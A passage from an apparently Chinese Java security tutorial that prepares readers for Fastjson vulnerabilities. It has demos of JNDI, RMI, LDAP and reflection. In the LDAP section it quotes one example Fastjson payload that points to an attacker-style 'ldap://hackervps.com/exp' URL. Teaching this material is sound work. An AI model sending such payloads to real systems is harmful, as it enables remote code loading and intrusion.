jakarta.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.sql.DataSource;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;</span><br><span class="line"><span class="keyword">import</span> java.sql.Statement;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/test&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 获取JNDI上下文</span></span><br><span class="line">            <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 查找数据源</span></span><br><span class="line">            <span class="type">Context</span> <span class="variable">envContext</span> <span class="operator">=</span> (Context) ctx.lookup(<span class="string">&quot;java:/comp/env&quot;</span>);</span><br><span class="line">            <span class="type">DataSource</span> <span class="variable">ds</span> <span class="operator">=</span> (DataSource) envContext.lookup(<span class="string">&quot;jdbc/security&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取连接</span></span><br><span class="line">            <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> ds.getConnection();</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;[+] success!&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 执行查询</span></span><br><span class="line">            <span class="type">Statement</span> <span class="variable">stmt</span> <span class="operator">=</span> conn.createStatement();</span><br><span class="line">            <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> stmt.executeQuery(<span class="string">&quot;select * from security.emails;&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 处理结果集</span></span><br><span class="line">            <span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">                System.out.println(rs.getString(<span class="string">&quot;email_id&quot;</span>));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 关闭连接</span></span><br><span class="line">            rs.close();</span><br><span class="line">            stmt.close();</span><br><span class="line">            conn.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>成功跑起来了：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678940374491-2a860b2a-0870-40b8-a504-0019cc5ed891.png#averageHue=%23f8f5f4&clientId=u5a3e9323-ecb0-4&from=paste&height=814&id=ua5fe7851&name=image.png&originHeight=1018&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=212963&status=done&style=none&taskId=u9a05a617-b988-4f85-90dd-fc1615e8cf6&title=&width=1536" alt="image.png"><br>然后访问<code>[http://localhost:6063/test](http://localhost:6063/test)</code>：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678940781085-073b70b4-6f21-42a4-bc56-453a330c8231.png#averageHue=%23fdfdfd&clientId=u5a3e9323-ecb0-4&from=paste&height=765&id=u653be59d&name=image.png&originHeight=956&originWidth=1318&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=30517&status=done&style=none&taskId=u5a626861-d6b2-478a-b562-88ede7b098e&title=&width=1054.4" alt="image.png"><br>没有出现<code>404</code>，说明<code>WebServlet</code>拦截成功，回到<code>idea</code>，发现查询成功：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678940740270-4c3ffea5-b5d4-4f34-af48-9f9e5ede55a9.png#averageHue=%23f7f6f4&clientId=u5a3e9323-ecb0-4&from=paste&height=813&id=ub1527115&name=image.png&originHeight=1016&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=198241&status=done&style=none&taskId=u3bc40381-6b60-4624-8688-2cf0a6660aa&title=&width=1536" alt="image.png"></p>
<h2 id="4-RMI是什么东西？"><a href="#4-RMI是什么东西？" class="headerlink" title="4. RMI是什么东西？"></a>4. RMI是什么东西？</h2><h3 id="（1）通过一个demo快速认识rmi是如何调用的"><a href="#（1）通过一个demo快速认识rmi是如何调用的" class="headerlink" title="（1）通过一个demo快速认识rmi是如何调用的"></a>（1）通过一个demo快速认识rmi是如何调用的</h3><p><code>RMI</code>指的是远程方法调用（<code>Remote Method Invocation</code>），是<code>Java</code>平台提供的一种机制，可以实现在不同<code>Java</code>虚拟机之间进行方法调用。这么说是真抽象，我们直接看下面使用了<code>RMI</code>的<code>demo</code>代码，包括一个服务器端和一个客户端。这个<code>demo</code>实现了一个简单的计算器程序，客户端通过<code>RMI</code>调用服务器端的方法进行加、减、乘、除四则运算。<br>首先是一个计算器接口：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Calculator</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">subtract</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">multiply</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">divide</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后是客户端代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Client</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// Get the registry</span></span><br><span class="line">            <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>, <span class="number">1060</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Lookup the remote object &quot;Calculator&quot;</span></span><br><span class="line">            <span class="type">Calculator</span> <span class="variable">calc</span> <span class="operator">=</span> (Calculator) registry.lookup(<span class="string">&quot;Calculator&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Call the remote method</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> calc.add(<span class="number">5</span>, <span class="number">7</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Print the result</span></span><br><span class="line">            System.out.println(<span class="string">&quot;Result: &quot;</span> + result);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;Client exception: &quot;</span> + e.toString());</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接着是服务端代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Server</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">Calculator</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Server</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> x + y;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">subtract</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">multiply</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">divide</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Server</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Server</span>();</span><br><span class="line">            LocateRegistry.createRegistry(<span class="number">1060</span>);</span><br><span class="line">            <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="number">1060</span>);</span><br><span class="line">            registry.bind(<span class="string">&quot;Calculator&quot;</span>, obj);</span><br><span class="line">            System.out.println(<span class="string">&quot;Server ready&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;Server exception: &quot;</span> + e.toString());</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后开始跑程序，不需要做任何配置。<br>先把服务端跑起来：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678943334990-44e60d9f-b5c1-40e9-8714-b743509cab0a.png#averageHue=%23f9f8f8&clientId=u5a3e9323-ecb0-4&from=paste&height=816&id=uab1c2e16&name=image.png&originHeight=1020&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=154898&status=done&style=none&taskId=u0d799428-063c-4e44-989a-74f0d213abb&title=&width=1536" alt="image.png"><br>然后客户端这里就可以直接运行<code>5+7</code>的结果了：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678943374347-f7bd0a65-439e-4fd8-8279-1f624791b3cf.png#averageHue=%23f9f8f7&clientId=u5a3e9323-ecb0-4&from=paste&height=818&id=u313ce13f&name=image.png&originHeight=1023&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=171110&status=done&style=none&taskId=u64403d77-1034-470e-9542-60216a99af3&title=&width=1536" alt="image.png"></p>
<h3 id="（2）深入理解rmi"><a href="#（2）深入理解rmi" class="headerlink" title="（2）深入理解rmi"></a>（2）深入理解rmi</h3><p>建议直接看素十八师傅的博客以及天下大木头的微信公众号文章，写的真的是太好了，都是适合细细品味的文章。</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://su18.org/post/rmi-attack/">https://su18.org/post/rmi-attack/</a><br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/wYujicYxSO4zqGylNRBtkA">https://mp.weixin.qq.com/s/wYujicYxSO4zqGylNRBtkA</a></p>
</blockquote>
<h2 id="5-ldap是什么？"><a href="#5-ldap是什么？" class="headerlink" title="5. ldap是什么？"></a>5. ldap是什么？</h2><p><code>LDAP</code>是轻型目录访问协议的缩写，是一种用于访问和维护分层目录信息的协议。在<code>Java</code>安全中，<code>LDAP</code>通常用于集成应用程序与企业目录服务（例如<code>Microsoft Active Directory</code>或<code>OpenLDAP</code>）的认证和授权功能。<br>使用<code>Java</code>的<code>LDAP API</code>，我们可以编写<code>LDAP</code>客户端来执行各种<code>LDAP</code>操作，如绑定（<code>bind</code>）到<code>LDAP</code>服务器、搜索目录、添加、修改和删除目录条目等。<code>Java LDAP API</code>支持使用简单绑定（<code>simple bind</code>）或<code>Kerberos</code>身份验证（<code>Kerberos authentication</code>）进行<code>LDAP</code>身份验证。<br><code>Java</code>应用程序可以使用<code>LDAP</code>来实现单点登录和跨域身份验证，并与其他应用程序和服务共享身份验证信息。<code>LDAP</code>还可以用于管理用户、组和权限，以及存储和管理应用程序配置信息等。<br>总结：<code>Java</code>中的<code>LDAP</code>是一种使用<code>Java</code>编写<code>LDAP</code>客户端来集成企业目录服务的技术，可以提供安全的身份验证和授权功能，以及方便的用户和配置管理。<br>这么说还是太抽象了，我们还是看一个<code>demo</code>来快速熟悉一下吧。</p>
<h3 id="（1）安装并配置ldap服务器"><a href="#（1）安装并配置ldap服务器" class="headerlink" title="（1）安装并配置ldap服务器"></a>（1）安装并配置ldap服务器</h3><p>这里我们选择<code>OpenLDAP</code>来进行安装。<a target="_blank" rel="noopener" href="https://www.openldap.org/">官网</a>只提供了<code>Linux</code>版本，我们可以去德国公司<code>maxcrc</code>的官网上面去下载<code>openldap for windows</code>：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.maxcrc.de/en/download-en/">https://www.maxcrc.de/en/download-en/</a></p>
</blockquote>
<p>这里我们选择<code>64</code>位的，懒人链接：<a target="_blank" rel="noopener" href="https://www.maxcrc.de/wp-content/uploads/2020/04/OpenLDAPforWindows_x64.zip">https://www.maxcrc.de/wp-content/uploads/2020/04/OpenLDAPforWindows_x64.zip</a><br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678944181394-19da149a-17be-4bb1-b7a0-cd45da9a87e2.png#averageHue=%23faf9f9&clientId=u5a3e9323-ecb0-4&from=paste&height=746&id=u93f4deae&name=image.png&originHeight=932&originWidth=1862&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=89233&status=done&style=none&taskId=uce2c258a-da0f-46b8-b786-9a5b22682cb&title=&width=1489.6" alt="image.png"><br>然后参考这篇文章进行安装：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/oscar999/article/details/108654461">https://blog.csdn.net/oscar999/article/details/108654461</a></p>
</blockquote>
<p>成功启动<code>ldap</code>服务：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678944538078-3326aee5-f7f0-41c1-bcfc-4884a11dd3ea.png#averageHue=%23181818&clientId=u5a3e9323-ecb0-4&from=paste&height=632&id=u19d1bdb8&name=image.png&originHeight=790&originWidth=1480&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=146886&status=done&style=none&taskId=ub6c884dc-3b1e-45f7-aec4-eb1c6bef903&title=&width=1184" alt="image.png"><br>顺便一提，在Windows上可以使用LDAP Browser来快速浏览查看查询，官网及下载地址如下：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://ldapbrowserwindows.com/">https://ldapbrowserwindows.com/</a><br><a target="_blank" rel="noopener" href="https://ldapclient.com/downloads610/LdapBrowser-6.10.x-win-x86-Setup.msi">https://ldapclient.com/downloads610/LdapBrowser-6.10.x-win-x86-Setup.msi</a></p>
</blockquote>
<p>啪的一下就连接上了，快啊，很快啊：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678944840530-01d5b61c-415e-425c-9f2a-a0aec5df274e.png#averageHue=%23fbfbfb&clientId=u5a3e9323-ecb0-4&from=paste&height=817&id=ua444aab4&name=image.png&originHeight=1021&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=40144&status=done&style=none&taskId=u17aef308-dd39-44d6-bdb7-2f77c1a2a5a&title=&width=1536" alt="image.png"></p>
<h3 id="（2）通过公司-员工管理的例子来理解Fastjson系列漏洞中ldap的作用"><a href="#（2）通过公司-员工管理的例子来理解Fastjson系列漏洞中ldap的作用" class="headerlink" title="（2）通过公司-员工管理的例子来理解Fastjson系列漏洞中ldap的作用"></a>（2）通过公司-员工管理的例子来理解Fastjson系列漏洞中ldap的作用</h3><p>假设有一个名为”<code>example.com</code>“的公司，需要存储和管理员工信息。他们使用<code>LDAP</code>作为员工信息的目录服务，每个员工都在<code>LDAP</code>中有一个唯一的标识符（<code>DN</code>）。这里我们举两个员工例子：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">DN: uid=john,ou=People,dc=example,dc=com</span><br><span class="line">cn: John Doe</span><br><span class="line">sn: Doe</span><br><span class="line">givenName: John</span><br><span class="line">uid: john</span><br><span class="line">userPassword: &#123;SHA&#125;W6ph5Mm5Pz8GgiULbPgzG37mj9g=</span><br><span class="line"></span><br><span class="line">DN: uid=alice,ou=People,dc=example,dc=com</span><br><span class="line">cn: Alice Smith</span><br><span class="line">sn: Smith</span><br><span class="line">givenName: Alice</span><br><span class="line">uid: alice</span><br><span class="line">userPassword: &#123;SHA&#125;W6ph5Mm5Pz8GgiULbPgzG37mj9g=</span><br></pre></td></tr></table></figure>
<p>在<code>LDAP</code>中，<code>DN</code>是一个唯一的标识符，它类似于文件系统中的路径。每个<code>DN</code>由多个<code>RDN</code>（相对区分名称）组成，例如：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid=john,ou=People,dc=example,dc=com</span><br></pre></td></tr></table></figure>
<p>这个<code>DN</code>由三个<code>RDN</code>组成：<code>uid=john</code>、<code>ou=People</code>、<code>dc=example,dc=com</code>。<br>可以使用如下<code>LDAP</code>查询语句来检索员工信息，例如：<code>(&amp;(objectClass=person)(uid=john))</code><br>这个查询语句表示查找所有<code>objectClass</code>为<code>person</code>，且<code>uid</code>为<code>john</code>的员工信息。在<code>LDAP</code>中，查询语句使用<code>LDAP</code>搜索过滤器（<code>LDAP Search Filter</code>）进行筛选。在<code>Fastjson</code>漏洞中，攻击者可以通过构造特定的<code>LDAP</code>查询语句，来执行任意代码或获取敏感信息。例如，以下<code>JSON</code>字符串包含一个恶意构造的<code>LDAP URL</code>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.net.URL&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;ldap://hackervps.com/exp&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
<p>当<code>Fastjson</code>解析该<code>JSON</code>字符串时，会触发<code>LDAP</code>查询操作，查询<code>hackervps.com</code>上的<code>LDAP</code>服务，并执行名为“<code>exp</code>”的操作。这就是<code>Fastjson</code>漏洞的成因之一。</p>
<h2 id="6-java反射是什么？"><a href="#6-java反射是什么？" class="headerlink" title="6. java反射是什么？"></a>6. java反射是什么？</h2><p>参考：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.javasec.org/javase/Reflection/Reflection.html">https://www.javasec.org/javase/Reflection/Reflection.html</a></p>
</blockquote>
<h3 id="（1）通过demo快速理解反射"><a href="#（1）通过demo快速理解反射" class="headerlink" title="（1）通过demo快速理解反射"></a>（1）通过demo快速理解反射</h3><p>如果我们不用反射的话，我们写的代码会是下面这样：<br><code>Person.java</code>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello, my name is &quot;</span> + name + <span class="string">&quot;, I&#x27;m &quot;</span> + age + <span class="string">&quot; years old.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>Main.java</code>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 创建Person对象</span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;张三&quot;</span>, <span class="number">20</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用Person对象的sayHello方法</span></span><br><span class="line">        person.sayHello();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 修改Person对象的age属性</span></span><br><span class="line">        person.setAge(<span class="number">30</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 输出修改后的Person对象信息</span></span><br><span class="line">        System.out.println(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果如下：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680265498770-06d129ea-46e6-4a00-9de3-39d99e308515.png#averageHue=%23f9f8f7&clientId=ud95377f6-2eb9-4&from=paste&height=699&id=u610eab0d&name=image.png&originHeight=874&originWidth=1243&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=130011&status=done&style=none&taskId=u599905ec-8599-44d8-986f-fd61a3c175e&title=&width=994.4" alt="image.png"><br>可以看到，我们一开始设置人的名字为张三，年龄为<code>20</code>，然后我们通过<code>setAge</code>方法来修改<code>Person</code>的<code>Age</code>属性，把年龄改成<code>30</code>。<br>但是这么写是有问题的，因为我们不可能总是在编译之前就已经确定好我们要具体改什么值了，我们更希望这个值可以动态变化，所以需要用到<code>Java</code>反射技术。我们可以修改上面的<code>Main.py</code>为如下内容：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span 